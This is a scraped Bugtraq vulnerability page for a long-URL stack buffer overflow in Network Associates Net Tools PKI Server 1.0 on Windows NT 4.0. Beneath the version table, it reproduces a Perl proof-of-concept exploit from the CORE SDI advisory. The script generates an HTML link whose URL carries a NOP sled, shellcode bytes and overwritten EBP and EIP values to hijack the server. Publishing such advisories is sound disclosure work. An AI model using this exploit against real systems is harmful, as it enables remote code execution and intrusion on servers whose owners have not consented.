#SpeeDr00t@Black Falcon<br>#bid1536<p><b><span style="font-size: 18pt;">NAI Net Tools PKI Server strong.exe Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1536/info">info</a><br><a href="http://www.securityfocus.com/bid/1536/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1536/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1536/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1536/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				1536
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Boundary Condition Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Aug 02 2000 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Aug 02 2000 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This vulnerability was discovered and detailed in an advisory (attached beneath) by CORE SDI, in particular by Juliano Rizzo &lt;juliano@core-sdi.com&gt;.

Disclaimer:

CORE SDI serve as SecurityFocus.com's network security auditors. SecurityFocus.com was in no 
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Network Associates Net Tools PKI Server 1.0 Hotfix2<br/>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP4<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Network Associates Net Tools PKI Server 1.0 Hotfix1<br/>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP4<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Network Associates Net Tools PKI Server 1.0 <br/>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6a<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP6<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP4<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP3<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP2<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0 SP1<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	As detailed in the CORE SDI advisory on this issue:<br/><br/>#!/usr/bin/perl<br/># NAI NetTools PKI SERVER 1.0 - Long URL Stack Overflow Exploit <br/># Replace host and port an create the html file: <br/>#./pkiluso.pl &gt; test.html<br/>#Open the html in a SSL compatible browser and click on the link. puf!<br/>#Juliano Rizzo (c) 2000 juliano@core-sdi.com<br/><br/>$host = "localhost";<br/>$port = "444";<br/>$shell_code= "\x90\x90\x90\x90";<br/><br/>#We can set the values of EIP and EBP, our code is on the stack<br/>#and in 0x01613A2E. <br/>$eip = "\x2E\x3A\x61\x01";#0x01613A2E (URL readed from socket)<br/>#$eip = "\x64\x83\x40%00";#0x00408364 (CALL EBP)<br/>$ebp = "\xCB\xF2\01\x02"; #0x0200F2CB (trunca el string por el 00)<br/>$noplen = (2965 - length($shell_code));<br/>print "&lt;html&gt;&lt;body&gt;&lt;a href=\"https://".$host.":".$port."/";<br/>print "\x90"x$noplen;<br/>print<br/>$shell_code.$ebp.$eip."\x18\x6B\x62\x01\x18\x6B\x62\x01\x18\x6B\x62\x01".<br/>"\"&gt;Click here to exploit.!&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;";<br/><br/>note: wrapped for readability
	
		<ul>
</ul>
</div>